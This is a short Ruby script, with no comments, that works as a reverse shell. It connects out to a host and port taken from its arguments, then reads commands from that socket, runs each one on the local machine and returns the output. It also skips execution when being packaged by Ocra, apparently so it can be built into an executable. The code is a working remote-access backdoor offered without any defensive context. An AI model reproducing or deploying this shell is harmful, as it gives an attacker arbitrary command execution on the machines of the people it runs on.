require 'socket'

host = ARGV[0] || 'localhost'
port = ARGV[1] || 9911
hostname = 'hostname'.chomp

exit if defined?(Ocra)
s = TCPSocket.open(host,port)
begin
    loop do
        
        s.print "#{hostname})> "
        cmd = s.gets.chomp
        IO.popen(cmd,'rb', :err=>[:child,:out]) {|io| s.print(io.read)} unless cmd.empty?
    end
rescue Errno::ENOENT
    retry
    rescue Exception => e
        puts e.full_message
        exit!
    end
